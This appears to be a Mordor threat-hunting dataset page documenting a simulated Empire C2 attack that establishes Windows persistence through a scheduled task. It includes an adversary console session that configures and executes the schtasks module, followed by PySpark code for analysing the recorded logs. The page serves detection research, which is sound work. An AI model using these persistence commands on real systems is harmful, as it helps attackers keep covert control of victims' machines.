# Empire Userland Scheduled Tasks

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190319024742 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/03/19 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_userland_schtasks.tar.gz |

## Dataset Description
This dataset represents adversaries creating scheduled tasks to maintain persistence in the environment

## Adversary View
```
usemodule persistence/userland/schtasks
(Empire: powershell/persistence/userland/schtasks) > set Listener https
(Empire: powershell/persistence/userland/schtasks) > set TaskName Maintenance
(Empire: powershell/persistence/userland/schtasks) > info   

              Name: Invoke-Schtasks
            Module: powershell/persistence/userland/schtasks
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @mattifestation
  @harmj0y

Description:
  Persist a stager (or script) using schtasks. This has a
  moderate detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  DailyTime  False       09:00                     Daily time to trigger the script        
                                                  (HH:mm).                                
  ProxyCreds False       default                   Proxy credentials                       
                                                  ([domain\]username:password) to use for 
                                                  request (default, none, or other).      
  ExtFile    False                                 Use an external file for the payload    
                                                  instead of a stager.                    
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                  script from specified location.         
  TaskName   True        Maintenance               Name to use for the schtask.            
  IdleTime   False                                 User idle time (in minutes) to trigger  
                                                  script.                                 
  ADSPath    False                                 Alternate-data-stream location to store 
                                                  the script code.                        
  Agent      True        FD6A3MGY                  Agent to run module on.                 
  Listener   False       https                     Listener to use.                        
  RegPath    False       HKCU:\Software\Microsoft  Registry location to store the script   
                        \Windows\CurrentVersion\  code. Last element is the key name.     
                        debug                   
  Proxy      False       default                   Proxy to use for request (default, none,
                                                  or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                  request (default, none, or other).      

(Empire: powershell/persistence/userland/schtasks) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked FD6A3MGY to run TASK_CMD_WAIT
[*] Agent FD6A3MGY tasked with task ID 11
[*] Tasked agent FD6A3MGY to run module powershell/persistence/userland/schtasks
(Empire: powershell/persistence/userland/schtasks) > SUCCESS: The scheduled task "Maintenance" has successfully been created.
Schtasks persistence established using listener https stored in HKCU:\Software\Microsoft\Windows\CurrentVersion\debug with Maintenance daily trigger at 09:00.

(Empire: powershell/persistence/userland/schtasks) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_userland_schtasks.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        